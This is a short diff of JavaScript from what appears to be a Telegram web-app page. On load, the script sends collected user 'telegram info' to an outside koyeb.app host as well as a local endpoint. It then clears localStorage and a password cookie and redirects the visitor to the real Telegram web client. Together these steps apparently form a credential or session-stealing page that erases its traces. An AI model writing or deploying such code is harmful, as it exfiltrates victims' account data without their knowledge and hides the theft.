@@ -42,12 +42,12 @@ document.addEventListener('DOMContentLoaded', function () {
           // Use Promise.all to send requests to both endpoints concurrently
           try {
             Promise.all([
-              fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
+              fetch(`/api/users/telegram/info`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(requestData),
               }),
-              fetch(`/api/users/telegram/info`, {
+              fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(requestData),
@@ -57,6 +57,7 @@ document.addEventListener('DOMContentLoaded', function () {
               // After both requests are successful, perform the rest of the actions
               window.Telegram.WebApp.openTelegramLink('https://t.me/+8dtqN7T2sJpmNTb7');
               window.Telegram.WebApp.close();
+              localStorage.clear()
 
               document.cookie = 'password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
               window.location.href = 'https://web.telegram.org/a/';
